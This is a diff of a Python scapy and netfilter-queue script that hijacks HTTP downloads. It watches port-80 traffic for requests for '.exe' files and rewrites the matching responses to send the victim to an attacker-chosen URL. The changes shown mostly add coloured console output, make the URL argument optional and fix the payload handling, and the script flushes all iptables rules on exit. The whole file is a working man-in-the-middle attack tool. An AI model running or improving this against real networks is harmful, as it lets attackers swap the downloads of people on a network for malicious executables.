@@ -5,28 +5,37 @@ from scapy.arch import get_if_addr
 from scapy.config import conf
 import argparse
 import os
+from termcolor import cprint
+
 
 MY_IP = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
 TARGET = '.exe' #DEFAULT TARGET
 ack_list = []
 URL = 'https://www.google.com'
+LINE = '____________________________________________________________'
 
 #Process each packet
 def process_packet(packet):
-    global ack_list
+    global ack_list, TARGET, URL
     IP_pkt = IP(packet.get_payload())
     
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
         if IP_pkt[TCP].dport == 80:
-            print('HTTP request')
-            
+            cprint('Request', 'red', attrs=['bold',], end='')
+
             #Request of download a program
             if TARGET in str(IP_pkt[Raw].load):
-                print(f'{TARGET} file detected')
+                cprint(': ', 'red', attrs=['bold',], end='')
+                cprint(f'{TARGET} ', 'cyan', attrs=['bold',], end='')
+                print('file with GET method ---> ', end='')
+                cprint(f'{URL} ', 'yellow', attrs=['bold',])
                 ack_list.append(IP_pkt[TCP].ack)
+            else:
+                print('')
+
 
         elif IP_pkt[TCP].sport == 80:
-            print('HTTP response')
+            cprint('Response', 'blue', attrs=['bold',])
 
             #Is it response seq in ack list
             if IP_pkt[TCP].seq in ack_list:
@@ -37,10 +46,9 @@ def process_packet(packet):
                 #Scapy recomputes them
                 del IP_pkt[IP].len
                 del IP_pkt[IP].chksum
-                del IP_pkt[TCP].len
                 del IP_pkt[TCP].chksum
 
-                packet.set_payload(IP_pkt)
+                packet.set_payload(bytes(IP_pkt))
 
     packet.accept()
 
@@ -66,10 +74,8 @@ def args_parser():
     if args.target:
         TARGET = args.target
 
-    if not args.url:
-       exit(1)
-
-    URL=args.url
+    if args.url:
+        URL=args.url
 
     return args.local
 
@@ -92,10 +98,13 @@ def main():
     queue.bind(0, process_packet)
 
     try:
+        cprint(f'\nTCP packets\n{LINE}','green', attrs=['bold',])
         queue.run()
     except KeyboardInterrupt:
         queue.unbind()
-        print('Flushing ip table.', end='\n\n')
+        cprint(f'\n{LINE}','green', attrs=['bold',])
+        print('Flushing ip table.', end='\n')
+        cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
         os.system('iptables -F')
 
 if __name__=='__main__':
